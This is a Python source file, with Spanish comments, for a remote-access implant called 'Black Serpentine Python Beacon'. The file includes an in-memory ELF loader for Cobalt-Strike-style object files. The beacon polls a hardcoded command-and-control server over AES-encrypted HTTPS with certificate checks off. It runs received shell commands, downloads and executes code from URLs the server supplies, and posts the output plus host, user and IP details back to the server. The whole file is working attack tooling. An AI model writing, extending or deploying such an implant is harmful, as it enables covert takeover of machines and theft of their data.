#!/usr/bin/env python3
"""
Pure-Python ELF-ET_REL loader para BOFs tipo Cobalt-Strike
x86-64, System-V relocations.
Replica fielmente el comportamiento del beacon en C.
"""
import json
import time
import base64
import socket
import platform
import requests
import subprocess
import random
from pathlib import Path
import ctypes, struct, os, sys

# Suprime advertencias de SSL para entornos C2 con certificados auto-firmados
requests.packages.urllib3.disable_warnings()

try:
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
except ImportError:
    print("[!] Error: No se pudo importar la librería 'cryptography'. Instálala (pip install cryptography).")
    sys.exit(1)


# ---------- CONFIG ----------
C2_BASE       = "https://10.10.14.57:4444"
MALEABLE_PATH = "/pleasesubscribe/v1/users/"
# ID de Cliente Fijo, según tu solicitud.
CLIENT_ID     = "python" 
FULL_URL      = C2_BASE + MALEABLE_PATH + CLIENT_ID
AES_KEY       = bytes.fromhex("88a41baa358a779c346d3ea784bc03f50900141bb58435f4c50864c82ff624ff")
SLEEP         = 6

# Constantes de mmap y mprotect
PROT_READ  = 0x1
PROT_WRITE = 0x2
PROT_EXEC  = 0x4
MAP_PRIVATE    = 0x02
MAP_ANONYMOUS  = 0x20
MAP_FAILED = -1
PAGE_SIZE = 4096 

# Constantes ELF
ET_REL = 1
SHT_PROGBITS, SHT_NOBITS, SHT_SYMTAB, SHT_STRTAB, SHT_RELA = 1, 8, 2, 3, 4
R_X86_64_64, R_X86_64_PC32, R_X86_64_PLT32 = 1, 2, 4
R_X86_64_32, R_X86_64_32S = 10, 11

# Cargar libc
try:
    libc = ctypes.CDLL(None)
    libc.mmap.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_int, 
                          ctypes.c_int, ctypes.c_int, ctypes.c_long]
    libc.mmap.restype = ctypes.c_void_p
    libc.mprotect.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_int]
    libc.mprotect.restype = ctypes.c_int
    libc.munmap.argtypes = [ctypes.c_void_p, ctypes.c_size_t]
    libc.munmap.restype = ctypes.c_int
except Exception as e:
    print(f"[CRÍTICO] No se pudo cargar libc: {e}")
    sys.exit(1)

# --- Cargar libbofloader.so ---
try:
    # Asegúrate de que el path sea correcto. './' busca en el directorio actual.
    libbofloader = ctypes.CDLL('./libbofloader.so')
    
    # Definir la firma de la función C que vamos a llamar
    libbofloader.execute_bof.argtypes = [
        ctypes.c_void_p,  # go_addr (dirección de la función 'go')
        ctypes.c_char_p,  # args (puntero a los argumentos)
        ctypes.c_int      # len (longitud de los argumentos)
    ]
    libbofloader.execute_bof.restype = None # La función no devuelve nada

except OSError as e:
    print(f"[CRÍTICO] No se pudo cargar la librería 'libbofloader.so': {e}")
    print("Por favor, compila 'loader_wrapper.c' y asegúrate de que 'libbofloader.so' esté en el mismo directorio.")
    sys.exit(1)



# ---------- CRYPTO ----------
def aes_cfb_decrypt(data_b64: str) -> bytes:
    raw = base64.b64decode(data_b64)
    iv, ct = raw[:16], raw[16:]
    cipher = Cipher(algorithms.AES(AES_KEY), modes.CFB(iv))
    decryptor = cipher.decryptor()
    return decryptor.update(ct) + decryptor.finalize()

def aes_cfb_encrypt(data: bytes) -> str:
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(AES_KEY), modes.CFB(iv))
    encryptor = cipher.encryptor()
    ct = encryptor.update(data) + encryptor.finalize()
    return base64.b64encode(iv + ct).decode()

# ---------- UTILS ----------
def get_ips():
    ips = set()
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ips.add(s.getsockname()[0])
        s.close()
    except:
        pass
    return ", ".join(sorted(ips)) or "127.0.0.1"

def exec_cmd(cmd):
    try:
        out = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        return out.stdout + out.stderr
    except Exception as e:
        return f"Error: {e}"

def set_executable_permissions(address, size):
    """
    Establece los permisos R+W+X en una región de memoria.
    Debe ser llamada después de mapear/cargar la sección de código.
    """
    if mprotect is None:
        print("[!] mprotect no está disponible. No se pueden cambiar los permisos.")
        return False

    # 1. Asegurar la alineación a página (mprotect requiere direcciones alineadas)
    page_start = address & ~(PAGE_SIZE - 1)
    
    # 2. Calcular el tamaño alineado (desde el inicio de la página hasta el final de la última página tocada)
    page_end = (address + size + PAGE_SIZE - 1) & ~(PAGE_SIZE - 1)
    page_aligned_size = page_end - page_start
    
    # 3. Permisos: Lectura (R) + Escritura (W) + Ejecución (X)
    prot = PROT_READ | PROT_WRITE | PROT_EXEC 

    print(f"[DEBUG] Llamando mprotect en 0x{page_start:x} con tamaño {page_aligned_size} para permisos RWE.")

    # 4. Llamada al sistema
    result = mprotect(page_start, page_aligned_size, prot)
    
    if result != 0:
        # errno puede dar más detalles
        print(f"[ERROR] mprotect falló con código {result}. El código de error (errno) es: {ctypes.get_errno()}")
        return False
    
    print("[SUCCESS] Memoria marcada como RWE (Ejecutable).")
    return True


# ---------- BEACON API STUB ----------
# Buffer de salida global para capturar el output del BOF
BEACON_OUTPUT_BUF = ctypes.create_string_buffer(8192)
BEACON_OUTPUT_LEN = ctypes.c_size_t(0)

# Mantener referencias globales (CRÍTICO)
_BeaconPrintf_callback = None
_BeaconOutput_callback = None

def init_beacon_stubs():
    global _BeaconPrintf_callback, _BeaconOutput_callback
    
    # Definir tipos de callback
    BEACONPRINTF_TYPE = ctypes.CFUNCTYPE(None, ctypes.c_int, ctypes.c_char_p)
    BEACONOUTPUT_TYPE = ctypes.CFUNCTYPE(None, ctypes.c_int, ctypes.c_char_p, ctypes.c_int)
    
    @BEACONPRINTF_TYPE
    def BeaconPrintf_stub(_type, fmt):
        global BEACON_OUTPUT_LEN
        try:
            msg = ctypes.string_at(fmt)
            n = len(msg)
            if BEACON_OUTPUT_LEN.value + n < 8192:
                ctypes.memmove(
                    ctypes.byref(BEACON_OUTPUT_BUF, BEACON_OUTPUT_LEN.value),
                    msg, n
                )
                BEACON_OUTPUT_LEN.value += n
        except Exception as e:
            sys.stderr.write(f"[!] Error en BeaconPrintf: {e}\n")
    
    @BEACONOUTPUT_TYPE
    def BeaconOutput_stub(_type, data, length):
        global BEACON_OUTPUT_LEN
        try:
            if BEACON_OUTPUT_LEN.value + length < 8192:
                ctypes.memmove(
                    ctypes.byref(BEACON_OUTPUT_BUF, BEACON_OUTPUT_LEN.value),
                    data, length
                )
                BEACON_OUTPUT_LEN.value += length
        except Exception as e:
            sys.stderr.write(f"[!] Error en BeaconOutput: {e}\n")
    
    # Guardar referencias para evitar GC
    _BeaconPrintf_callback = BeaconPrintf_stub
    _BeaconOutput_callback = BeaconOutput_stub
    
    return _BeaconPrintf_callback, _BeaconOutput_callback

# Llamar al inicio
_BeaconPrintf_callback, _BeaconOutput_callback = init_beacon_stubs()




# ---------- loader ELF ET_REL ------------------------------------------
def align(x, a):
    """Alinear x al múltiplo superior de a"""
    return (x + a - 1) & ~(a - 1)


class RunELF:
    """
    Loader ELF ET_REL (relocable) para ejecutar BOFs en Python.
    Sigue la arquitectura de 4 fases del loader C funcional.
    """
    
    def __init__(self, blob: bytes):
        """
        Parsear cabeceras ELF y preparar estructuras.
        
        Args:
            blob: Bytes del archivo ELF relocable (.o)
        """
        self.data = memoryview(blob)
        self.ehdr = self.data[0:64]
        
        # Validar magic ELF
        if self.ehdr[:4].tobytes() != b'\x7fELF':
            raise ValueError("No es un archivo ELF válido")
        
        # Validar tipo ET_REL
        if struct.unpack_from('<H', self.ehdr, 16)[0] != ET_REL:
            raise ValueError("Tipo de ELF no soportado. Se espera ET_REL (relocable)")
        
        # Extraer información del header
        self.shoff = struct.unpack_from('<Q', self.ehdr, 40)[0]  # Section header offset
        self.shent = struct.unpack_from('<H', self.ehdr, 58)[0]  # Section header entry size
        self.shnum = struct.unpack_from('<H', self.ehdr, 60)[0]  # Number of sections
        
        # Parsear todas las section headers
        self.shdrs = [self._shdr(i) for i in range(self.shnum)]
        
        # Encontrar tablas de símbolos y strings
        self.symtab, self.strtab = self._find_sym_str()
        
        # Arrays para tracking de secciones mapeadas
        self.sections = [None] * self.shnum          # (addr, size) tuples
        self.aligned_sizes = [0] * self.shnum        # Tamaños alineados para munmap
        self.external_symbols = {}                   # Caché de símbolos pre-resueltos
        
        print(f"[DEBUG] ELF parseado: {self.shnum} secciones")

    def _shdr(self, idx):
        """
        Leer una section header por índice.
        
        Returns:
            tuple: (sh_name, sh_type, sh_flags, sh_addr, sh_offset, sh_size,
                   sh_link, sh_info, sh_addralign, sh_entsize)
        """
        off = self.shoff + idx * self.shent
        buf = self.data[off:off+64]
        return struct.unpack('<IIQQQQIIQQ', buf)

    def _find_sym_str(self):
        """
        Encontrar índices de las secciones SHT_SYMTAB y SHT_STRTAB.
        
        Returns:
            tuple: (symtab_idx, strtab_idx)
        """
        symtab_idx = None
        strtab_idx = None

        for i, sh in enumerate(self.shdrs):
            if sh[1] == SHT_SYMTAB:
                symtab_idx = i
                strtab_idx = sh[6]  # sh_link apunta a la string table asociada
                
                # Validaciones
                if strtab_idx >= len(self.shdrs):
                    raise ValueError(f"SHT_SYMTAB sh_link ({strtab_idx}) fuera de rango")
                if self.shdrs[strtab_idx][1] != SHT_STRTAB:
                    actual_type = self.shdrs[strtab_idx][1]
                    raise ValueError(f"sh_link apunta a tipo {actual_type}, esperado SHT_STRTAB")
                break

        if symtab_idx is None:
            raise ValueError("No se encontró la sección SHT_SYMTAB")

        return symtab_idx, strtab_idx

    def _preresolve_external_symbols(self):
        """
        FASE 1: Pre-resolver TODOS los símbolos externos antes de mapear secciones.
        Esto evita problemas de resolución en tiempo de relocalización.
        """
        print("[DEBUG] === FASE 1: Pre-resolviendo símbolos externos ===")
        
        st_ent = 24  # Tamaño de Elf64_Sym
        symtab_shdr = self.shdrs[self.symtab]
        sym_count = symtab_shdr[5] // st_ent
        
        for idx in range(sym_count):
            off = symtab_shdr[4] + idx * st_ent
            st_name = struct.unpack_from('<I', self.data[off:])[0]
            st_shndx = struct.unpack_from('<H', self.data[off:], 6)[0]
            
            # Solo procesar símbolos externos (st_shndx == SHN_UNDEF = 0)
            if st_shndx != 0:
                continue
            
            # Obtener nombre del símbolo
            name_off = self.shdrs[self.strtab][4] + st_name
            name = self.data[name_off:].tobytes().split(b'\0')[0].decode('utf-8', errors='ignore')
            
            if not name:
                continue
            
            # Resolver símbolos del Beacon API
            if name == "BeaconPrintf":
                addr = ctypes.cast(_BeaconPrintf_callback, ctypes.c_void_p).value
                self.external_symbols[name] = addr
                print(f"[DEBUG] ✅ {name} -> 0x{addr:x}")
                continue
            
            if name == "BeaconOutput":
                addr = ctypes.cast(_BeaconOutput_callback, ctypes.c_void_p).value
                self.external_symbols[name] = addr
                print(f"[DEBUG] ✅ {name} -> 0x{addr:x}")
                continue
            
            # Resolver símbolos comunes de libc
            libc_symbols = ['memcpy', 'memset', 'strlen', 'malloc', 'free', 
                           'strcpy', 'strcmp', 'strcat', 'printf', 'sprintf',
                           'socket', 'connect', 'send', 'recv', 'close']
            
            if name in libc_symbols:
                try:
                    func_ptr = ctypes.cast(getattr(libc, name, None), ctypes.c_void_p).value
                    if func_ptr:
                        self.external_symbols[name] = func_ptr
                        print(f"[DEBUG] ✅ {name} (libc) -> 0x{func_ptr:x}")
                        continue
                except Exception as e:
                    print(f"[!] Error resolviendo {name} en libc: {e}")
            
            # Fallback: intentar dlsym genérico
            try:
                func_ptr = ctypes.cast(getattr(libc, name, None), ctypes.c_void_p).value
                if func_ptr:
                    self.external_symbols[name] = func_ptr
                    print(f"[DEBUG] ✅ {name} (dlsym) -> 0x{func_ptr:x}")
                else:
                    print(f"[!] Símbolo externo no resuelto: {name}")
            except Exception as e:
                print(f"[!] Error resolviendo {name}: {e}")

    def load(self):
        """
        Cargar y preparar el ELF para ejecución.
        
        Fases:
        1. Pre-resolver símbolos externos
        2. Mapear secciones como RW (sin EXEC)
        3. Aplicar relocalizaciones
        4. Cambiar permisos a RX (W^X enforcement)
        """
        # FASE 1: Pre-resolver símbolos externos
        self._preresolve_external_symbols()
        
        # FASE 2: Mapear secciones como RW
        print("[DEBUG] === FASE 2: Mapeando secciones como RW ===")
        for i, sh in enumerate(self.shdrs):
            # Solo mapear secciones con flag SHF_ALLOC
            if not (sh[2] & 0x2):
                continue
            
            sz = sh[5]  # sh_size
            if sz == 0:
                continue
            
            # Alinear a página
            memsz = align(sz, PAGE_SIZE)
            self.aligned_sizes[i] = memsz
            
            # ✅ Mapear solo como RW (sin PROT_EXEC todavía)
            addr_ptr = libc.mmap(0, memsz, PROT_READ | PROT_WRITE, 
                                MAP_PRIVATE | MAP_ANONYMOUS, -1, 0)
            
            if addr_ptr == MAP_FAILED:
                raise OSError(f"mmap falló para la sección {i}")
            
            # Copiar datos según el tipo de sección
            if sh[1] == SHT_PROGBITS:
                # Sección con datos (código, datos inicializados)
                ctypes.memmove(addr_ptr, self.data[sh[4]:sh[4]+sz].tobytes(), sz)
            elif sh[1] == SHT_NOBITS:
                # Sección BSS (datos no inicializados)
                ctypes.memset(addr_ptr, 0, sz)
            
            self.sections[i] = (addr_ptr, memsz)
            print(f"[DEBUG] Sección {i} mapeada: 0x{addr_ptr:x} (size={memsz}, permisos=RW)")

        # FASE 3: Aplicar relocalizaciones
        print("[DEBUG] === FASE 3: Aplicando relocalizaciones ===")
        self._reloc()

        # FASE 4: Hacer ejecutable (W^X)
        print("[DEBUG] === FASE 4: Aplicando PROT_EXEC (W^X) ===")
        for i, sh in enumerate(self.shdrs):
            if self.sections[i] and (sh[2] & 0x4):  # SHF_EXECINSTR
                addr_ptr, _ = self.sections[i]
                aligned_size = self.aligned_sizes[i]
                
                # ✅ Cambiar de RW a RX (sin WRITE - W^X enforcement)
                result = libc.mprotect(addr_ptr, aligned_size, PROT_READ | PROT_EXEC)
                if result != 0:
                    raise OSError(f"mprotect RX falló para sección {i} (errno={ctypes.get_errno()})")
                
                print(f"[DEBUG] Sección {i} ahora es R+X (ejecutable)")

    def _reloc(self):
        """
        Aplicar todas las relocalizaciones usando símbolos pre-resueltos,
        con logging detallado.
        """
        print("[DEBUG] === FASE 3: Aplicando relocalizaciones ===")
        
        for i, sh in enumerate(self.shdrs):
            if sh[1] != SHT_RELA:
                continue
            
            target = sh[6]  # sh_info: sección a la que aplicar relocalizaciones
            if not self.sections[target]:
                print(f"[DEBUG] Sección de destino {target} no cargada, saltando relocalizaciones para la sección {i}")
                continue
            
            base = self.sections[target][0]
            off, sz = sh[4], sh[5]  # sh_offset y sh_size de la sección .rela
            entries = sz // 24  # Cada entrada de relocalización es de 24 bytes
            
            print(f"[DEBUG] Procesando sección de relocalización {i} ({entries} entradas) para la sección de destino {target}")

            for e in range(entries):
                # ✅ CORRECCIÓN: Usar offset directo en lugar de slicing
                current_offset = off + e * 24

                # Verificación de seguridad para evitar leer fuera del buffer
                if current_offset + 24 > len(self.data):
                    print(f"[ERROR] Intento de leer fuera de los límites del ELF en la sección de relocalización {i}, entrada {e}. Abortando.")
                    break

                # Desempaquetar directamente desde el memoryview principal
                r_off, r_info, r_add = struct.unpack_from('<QQq', self.data, current_offset)
                
                sym_idx = (r_info >> 32)
                r_type = r_info & 0xffffffff
                loc = base + r_off
                
                sym_addr = self._get_symbol_value(sym_idx)
                
                print(f"  [RELOC] Ent: {e}, Tipo: {r_type}, Offset: 0x{r_off:x}, Loc: 0x{loc:x}, Add: {r_add}, SymVal: 0x{sym_addr:x}")

                # Aplicar la relocalización según el tipo
                if r_type == R_X86_64_64:
                    ctypes.c_uint64.from_address(loc).value = sym_addr + r_add
                elif r_type in (R_X86_64_PC32, R_X86_64_PLT32):
                    delta = sym_addr + r_add - loc
                    if delta < -2**31 or delta >= 2**31:
                        print(f"  [ERROR] Relocalización PC32 fuera de rango para la entrada {e}")
                        continue
                    ctypes.c_int32.from_address(loc).value = int(delta)
                elif r_type == R_X86_64_32:
                    val = (sym_addr + r_add) & 0xFFFFFFFF
                    ctypes.c_uint32.from_address(loc).value = val
                elif r_type == R_X86_64_32S:
                    val = sym_addr + r_add
                    if val < -2**31 or val >= 2**31:
                        print(f"  [ERROR] Relocalización R_X86_64_32S fuera de rango para la entrada {e}")
                        continue
                    ctypes.c_int32.from_address(loc).value = int(val)
                else:
                    print(f'  [!] Relocalización no soportada: tipo {r_type} en 0x{loc:x}')

    def _get_symbol_value(self, idx):
        """
        Obtener el valor (dirección) de un símbolo por su índice.
        
        Args:
            idx: Índice del símbolo en la tabla de símbolos
            
        Returns:
            int: Dirección del símbolo
        """
        st_ent = 24  # sizeof(Elf64_Sym)
        off = self.shdrs[self.symtab][4] + idx * st_ent
        
        st_name = struct.unpack_from('<I', self.data[off:])[0]
        st_shndx = struct.unpack_from('<H', self.data[off:], 6)[0]
        st_value = struct.unpack_from('<Q', self.data[off:], 8)[0]
        
        # Obtener nombre del símbolo
        name_off = self.shdrs[self.strtab][4] + st_name
        name = self.data[name_off:].tobytes().split(b'\0')[0].decode('utf-8', errors='ignore')

        # Símbolos externos: usar caché de pre-resolución
        if st_shndx == 0:  # SHN_UNDEF
            return self.external_symbols.get(name, 0)

        # Símbolos internos del BOF
        sh = self.shdrs[st_shndx]
        
        # Verificar que la sección sea asignable
        if not (sh[2] & 0x2):  # SHF_ALLOC
            return 0
        
        if self.sections[st_shndx] is None:
            print(f"[!] Símbolo '{name}' en sección {st_shndx} no cargada")
            return 0
        
        base = self.sections[st_shndx][0]
        return base + st_value

    def _find_sym(self, name: bytes):
        """
        Buscar un símbolo por nombre.
        
        Args:
            name: Nombre del símbolo (bytes)
            
        Returns:
            int or None: Índice del símbolo, o None si no se encuentra
        """
        st_ent = 24
        symtab_shdr = self.shdrs[self.symtab]
        off = symtab_shdr[4]
        str_off = self.shdrs[self.strtab][4]
        sym_count = symtab_shdr[5] // st_ent
        
        for idx in range(sym_count):
            st_name = struct.unpack_from('<I', self.data[off + idx * st_ent:])[0]
            sym_name = self.data[str_off + st_name:].tobytes().split(b'\0')[0]
            if sym_name == name:
                return idx
        return None

    def run(self, func: bytes = b'go', args: bytes = b''):
        """
        Ejecuta el BOF delegando la llamada a la librería C externa 'libbofloader.so',
        que se encarga del aislamiento de stack de forma segura.
        """
        # 1. Encontrar la dirección del punto de entrada del BOF (normalmente 'go')
        sym_idx = self._find_sym(func)
        if sym_idx is None:
            raise RuntimeError(f'Símbolo {func.decode()} no encontrado')
        
        go_addr = self._get_symbol_value(sym_idx)
        if go_addr == 0:
            raise RuntimeError(f'Símbolo {func.decode()} resuelto a 0')

        print(f"[DEBUG] Ejecutando '{func.decode()}' en 0x{go_addr:x} via libbofloader.so")
        sys.stdout.flush()

        # 2. Preparar los argumentos para la función C
        # Creamos un buffer de bytes a partir de los argumentos
        args_buf = ctypes.create_string_buffer(args)

        # 3. Llamar a la función 'execute_bof' de la librería compartida
        try:
            libbofloader.execute_bof(
                ctypes.c_void_p(go_addr),  # Puntero a la función 'go'
                args_buf,                  # Puntero a los argumentos
                len(args)                  # Longitud de los argumentos
            )
            print(f"[DEBUG] ✅ Ejecución de '{func.decode()}' completada via wrapper C.")
        
        except Exception as e:
            # Este bloque se ejecutaría si hay un problema en la llamada a la librería,
            # pero el segfault del BOF ocurrirá dentro de la ejecución de C.
            print(f"[!] Excepción durante la llamada a libbofloader.so: {e}")
            raise

 
    def cleanup(self):
        """
        Liberar todas las secciones mapeadas.
        Debe ser llamado cuando el BOF ya no sea necesario.
        """
        for i in range(self.shnum):
            if self.sections[i]:
                addr_ptr, _ = self.sections[i]
                aligned_size = self.aligned_sizes[i]
                libc.munmap(addr_ptr, aligned_size)
                self.sections[i] = None
        
        print("[DEBUG] Memoria del BOF liberada")

    def __del__(self):
        """Destructor: limpiar memoria automáticamente"""
        try:
            self.cleanup()
        except:
            pass


# ---------- interfaz para el BEACON ------------------------------------
def run_bof_and_capture(elf_blob: bytes, args: str) -> str:
    global BEACON_OUTPUT_LEN
    
    # Reiniciar la longitud y limpiar el buffer antes de la ejecución
    BEACON_OUTPUT_LEN.value = 0
    ctypes.memset(BEACON_OUTPUT_BUF, 0, BEACON_OUTPUT_BUF._length_)
    
    try:
        loader = RunELF(elf_blob)
        loader.load()
        loader.run(b'go', args.encode())
        return BEACON_OUTPUT_BUF.raw[:BEACON_OUTPUT_LEN.value].decode('utf-8', errors='replace')
    except Exception as e:
        sys.stderr.write(f"[!] Error al ejecutar BOF: {e}\n")
        return f"[!] Error al ejecutar BOF: {e}"

def download_bof(url):
    try:
        r = requests.get(url, verify=False, timeout=10)
        if r.status_code == 200:
            return r.content
        else:
            print(f"[!] HTTP Error descargando BOF: {r.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"[!] Error de Descarga: {e}")
    return None

# ---------- BEACON MAIN LOOP ----------
def beacon():
    user_name = os.getenv("USER") or os.getenv("LOGNAME") or os.getenv("USERNAME") or "unknown"
    print(f"[+] Black Serpentine Python Beacon iniciado. ID de Cliente: {CLIENT_ID}")
    print(f"[+] URL de C2: {FULL_URL}")
    print(f"[+] Plataforma: {platform.system()} {platform.machine()}")

    while True:
        try:
            # 1. Check-in y descarga de comandos
            r = requests.get(FULL_URL, verify=False, timeout=SLEEP)
            if r.status_code != 200 or not r.text.strip():
                time.sleep(SLEEP)
                continue

            cmd_data = aes_cfb_decrypt(r.text)
            if not cmd_data:
                time.sleep(SLEEP)
                continue

            cmd = cmd_data.decode('utf-8', errors='replace').strip()
            if not cmd:
                time.sleep(SLEEP)
                continue

            print(f"[*] Comando recibido: {cmd}")

            output = ""
            if cmd.startswith("bof:"):
                parts = cmd[4:].strip().split(" ", 1)
                bof_url = parts[0]
                bof_args = parts[1] if len(parts) > 1 else ""
                print(f"[*] Descargando BOF desde: {bof_url}")
                bof_data = download_bof(bof_url)
                if bof_data:
                    output = run_bof_and_capture(bof_data, bof_args)
                    print(output)
                else:
                    output = "[!] Falló la descarga del BOF."
            else:
                output = exec_cmd(cmd)

            # 2. Preparación y envío de la respuesta
            data = {
                "output": output,
                "client": platform.system().lower(),
                "command": cmd,
                "pid": os.getpid(),
                "hostname": socket.gethostname(),
                "ips": get_ips(),
                "user": user_name,
                "discovered_ips": "",
                "result_portscan": None,
                "result_pwd": str(Path.cwd()),
                "arch": platform.machine(),
                "platform": platform.platform()
            }

            json_str = json.dumps(data, separators=(',', ':'))
            enc_payload = aes_cfb_encrypt(json_str.encode())
            
            print(f"[*] Enviando respuesta. Longitud: {len(output)} bytes")
            requests.post(
                FULL_URL,
                data=enc_payload,
                headers={"Content-Type": "text/plain"},
                verify=False,
                timeout=10
            )

        except requests.exceptions.RequestException as e:
            print(f"[ERROR DE RED] C2 inalcanzable o solicitud fallida: {e}")
        except Exception as e:
            print(f"[ERROR GENERAL] {e}")

        time.sleep(SLEEP)

if __name__ == "__main__":
    beacon()
